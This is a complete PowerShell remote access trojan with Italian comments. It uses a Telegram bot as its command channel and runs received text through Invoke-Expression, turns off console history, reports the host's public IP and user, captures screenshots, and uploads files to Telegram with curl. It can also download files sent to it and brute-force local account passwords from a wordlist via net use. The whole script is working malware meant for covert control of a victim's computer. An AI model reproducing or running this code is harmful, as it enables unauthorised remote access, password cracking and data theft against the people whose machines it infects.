# Pulisce la console
Clear-Host

# Imposta l'opzione per non salvare la cronologia della console
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Imposta la posizione corrente nella cartella dell'utente
Set-Location -Path $env:USERPROFILE

# Aggiunge i tipi necessari per utilizzare le finestre di sistema
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Crea una sessione di richieste web
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Imposta variabili per l'ID e il token dell'API di Telegram
$telegram_id, $api_token  = "@1", "@2"
$api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
$api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
$api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id

# Imposta la variabile di preferenza globale $ProgressPreference su 'SilentlyContinue'
$Global:ProgressPreference = 'SilentlyContinue'


# Funzione che verifica se l'utente ha i privilegi di amministratore
function CheckAdminRights
{
    # Verifica se l'utente ha i privilegi di amministratore
    $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
    $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($elevated) { return ("L'utente '$env:USERNAME' ha i privilegi di amministratore") } 
    else { return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore") }
}


# Funzione che ottiene gli account locali
function GetLocalAccounts
{
    # Invia un messaggio indicando che la ricerca degli account validi è in corso
    SendMessage "Ricerca degli account validi in corso..."    
    # Invia un messaggio con l'elenco degli account locali trovati
    SendMessage ("Account trovati: " + (Get-WmiObject Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true -and $_.Status -eq 'OK' }).Name -join ', ')
}


# Funzione per eseguire l'operazione di BruteForce su un account
function CrackAccount ($account, $wordlist) 
{
    # Carica la wordlist in memoria se esiste
    if (Test-Path $wordlist) { 
        $wordlist = Get-Content $wordlist; 
        Log "Wordlist caricata in memoria" 
    }
    else { SendMessage "Wordlist inesistente" }

    # Invia un messaggio indicando l'inizio dell'operazione di BruteForce
    SendMessage "Inizio operazione di BruteForce dell'account $utente"

    try {
        # Disconnette eventuali connessioni precedenti
        net use \\127.0.0.1 /d /y 2>&1 | Out-Null
    } catch { }

    $pass_found = $false

    # Ciclo attraverso la wordlist per provare diverse password
    foreach ($word in $wordlist) {
        try {
            # Prova a connettersi con l'account e la password correnti
            $result = net use \\127.0.0.1 /user:$account $word 2>&1
            $exitCode = $LASTEXITCODE

            # Se la connessione è avvenuta con successo, la password è stata trovata
            if ($exitCode -eq 0) {
                SendMessage "Password trovata [$account > $word]"
                net use \\127.0.0.1 /d /y 2>&1 | Out-Null
                $pass_found = $true
                break
            }
        } catch { }
    }

    # Se la password non è stata trovata, invia un messaggio appropriato
    if (!($pass_found)) { SendMessage "Password non trovata" }
}

# Funzione per catturare uno screenshot della schermata principale
function GetScreenshot
{
    try {
        # Invia un messaggio indicando l'inizio del processo di cattura dello screenshot
        SendMessage "Procedo a catturare la schermata..."

        # Ottiene l'oggetto Screen corrispondente alla schermata principale
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen

        # Crea un oggetto Bitmap con le dimensioni della schermata
        $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height

        # Crea un oggetto Graphics da associare al Bitmap
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

        # Copia l'immagine dalla schermata al Bitmap
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)

        # Imposta il percorso completo per salvare il file di output nella cartella dell'applicazione
        $outputPath = Join-Path $env:APPDATA ("screen_"+$env:COMPUTERNAME+".png")

        # Salva il Bitmap come file PNG
        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)

        # Rilascia le risorse degli oggetti Bitmap e Graphics
        $bitmap.Dispose()
        $graphics.Dispose()

        # Invia il file screenshot tramite la funzione SendFile
        SendFile $outputPath

        # Rimuove il file screenshot dopo l'invio
        Remove-Item $outputPath -Force
    }
    catch {
        # In caso di errore, invia un messaggio con la descrizione dell'errore
        SendMessage $Error[0]
    }
}



# Funzione per scaricare un file da Telegram utilizzando l'API
function DownloadFile($file_id, $file_name)
{
    # Ottiene il percorso del file dal server Telegram tramite l'API
    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
    $file_path      = $get_file_path.result.file_path

    # Scarica effettivamente il file utilizzando il percorso ottenuto
    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session

    # Verifica se il file è stato scaricato con successo
    if (Test-Path -Path $file_name) { SendMessage "File scaricato con successo" } 
    else { SendMessage "Il file non è stato scaricato" }
}



# Funzione per inviare un file tramite l'API di Telegram
function SendFile($filePath) 
{
    # Invia un messaggio indicando l'inizio del processo di invio del file
    SendMessage "Procedo ad inviare il file [$($filePath)]"

    # Verifica se il file specificato esiste
    if (Test-Path -Path $filePath -PathType Leaf) {
        # Se il file esiste, tenta di inviarlo tramite l'utilità curl.exe
        try {
            # Utilizza curl.exe per inviare il file all'API di Telegram
            curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null
        } 
        catch {
            # In caso di errore durante l'upload, invia un messaggio di errore
            SendMessage "Errore durante l'upload del file: [$($Error[0])]"
        }
    } 
    else {
        # Se il file non esiste, invia un messaggio indicando che il file non è stato trovato
        SendMessage "Il file indicato non è stato trovato"
    }
}



function SendMessage($output)
{
    # To escape _*``[\
    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"

    # Crea un oggetto contenente le informazioni da inviare a Telegram
    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "```````nHOST: [$(Invoke-RestMethod -Uri "ident.me" -WebSession $session)] $env:COMPUTERNAME ($env:USERNAME)`n$output`n``````"
    }

    # Converte le informazioni in formato JSON
    $MessageToSend = $MessageToSend | ConvertTo-Json

    try {
        # Invia il messaggio a Telegram
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
    } catch { Start-Sleep -Seconds 3 }
}


function CheckRequiredParameters($CommandString)
{
    # Dividi la stringa del comando in un array di parole
    $commandParts = $CommandString -split ' '

    # Il primo elemento è il nome del comando
    $commandName = $commandParts[0]

    # Verifica se il comando è un alias
    if ((Get-Command -Name $commandName).CommandType -eq "Alias") {
        # Recupera il comando associato all'alias
        $commandName = (Get-Alias -Name $commandName).Definition
    }

    # Verifica se è un cmdlet
    if ((Get-Command -Name $commandName).CommandType -eq 'Cmdlet') {
        # Ottengo i parametri obbligatori per il comando
        $requiredParameters = Get-Help -Name $commandName -Parameter * -ErrorAction SilentlyContinue | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
        if ($requiredParameters.Count -eq 0) { return $true }

        # Restringo l'array agli argomenti (escludendo il nome del comando)
        $arguments = $commandParts[1..$($commandParts.Count - 1)]

        # Estraggo i nomi dei parametri dagli argomenti
        $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }

        # Verifico se i parametri obbligatori sono presenti tra i nomi dei parametri
        $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }

        if ($missingParameters.Count -gt 0) {
            SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
            return $false
        } else { return $true }
    } else { return $true }
}


# Funzione principale per ascoltare i comandi da Telegram
function CommandListener
{
    $offset = 0
    $hostia = $env:COMPUTERNAME
    $hostname = $hostia

    try {
        # Invia un messaggio indicando che il computer è online
        SendMessage "Computer online!"
    } catch {
        # In caso di errore, chiude tutto
        return
    }

    while ($true) {        
        try {
            # Ottiene i nuovi messaggi da Telegram
            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session

            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
                # Verifica dell'ultimo parametro offset del Bot di Telegram
                if ($offset -eq 0) { $offset = $message.result.Count; Start-Sleep -Seconds 1; continue }
                
                # Recupera le informazioni dell'ultimo messaggio
                $offset     = $message.result.Count
                $message    = $message.result.Message[-1]
                $user_id    = $message.chat.id
                $username   = $message.chat.username
                $text       = $message.text
                $document   = $message.document

                if ($text.Length -gt 0) {
                    # Separa il messaggio per ogni parola in esso
                    $check_command = $text.Split()
                    # Verifica se la prima parola del messaggio è "set" ovvero un comando di controllo supplementare
                    if ($check_command[0] -match "set") {
                        # Verifica se il comando "set all" è stato inviato per impostare qualsiasi computer per rispondere ai messaggi
                        if ($check_command[1] -match "all") { $hostname = $hostia; SendMessage "Computer pronto a ricevere istruzioni insieme agli altri host" } 
                        else {
                            # Verifica se il comando "set ... " abbia come seconda istruzione l'hostname della macchina da controllare
                            $hostname = $check_command[1] # Imposta questo computer come l'unico host a rispondere ai comandi 
                            if ($env:COMPUTERNAME -match $hostname) { SendMessage "Computer pronto a ricevere istruzioni" }
                        }
                        continue
                    }
                    
                    # Verifica se il messaggio matcha la stringa "online" per verificare quale computer sia operativo
                    if ($check_command[0] -match "online") { SendMessage "Computer operativo"; continue }
                }

                if ($hostname -match $hostia) {
                    if ($user_id -match $telegram_id) {
                        if ($text.Length -gt 0) {
                            try {
                                # Se il messaggio ricevuto non ha parametri obbligatori esegue il comando all'interno del messaggio altrimenti viene skippato
                                if (CheckRequiredParameters $text) {
                                    # Verifica se il comando indica a powershell di spostarsi in un'altra cartella da quella in cui è attualmente
                                    $change_location_check = $text -split ' ' | Select-Object -First 1
                                    if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                                    # Esegue l'istruzione
                                    $output = Invoke-Expression -Command $text | Out-String 
                                } 
                                else { continue }
                            } catch { $output = $Error[0] | Out-String }

                            # Suddivide l'output in blocchi più piccoli per evitare limiti di dimensione
                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
                                $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
                            }

                            # Invia ciascun blocco di output come messaggio separato
                            foreach ($block in $output_splitted) { 
                                $block = $block | Out-String
                                SendMessage $block
                            }

                            # Se l'output è vuoto, invia un messaggio di conferma
                            if ($output_splitted.Count -eq 0) { Start-Sleep -Milliseconds 300; SendMessage "Comando eseguito" }
                        }

                        # Se è stato inviato un documento, scaricalo
                        if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
                    } else {
                        # Se l'utente non è autorizzato, registra il tentativo
                        $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
                        SendMessage $unauth_user_found
                    }
                }
            }
            Start-Sleep -Milliseconds 1000
        } catch { Start-Sleep -Seconds 5 }
    }
    # Elimina la sessione di richieste web
    $session.Dispose()
}

# Avvia la funzione principale per ascoltare i comandi
CommandListener
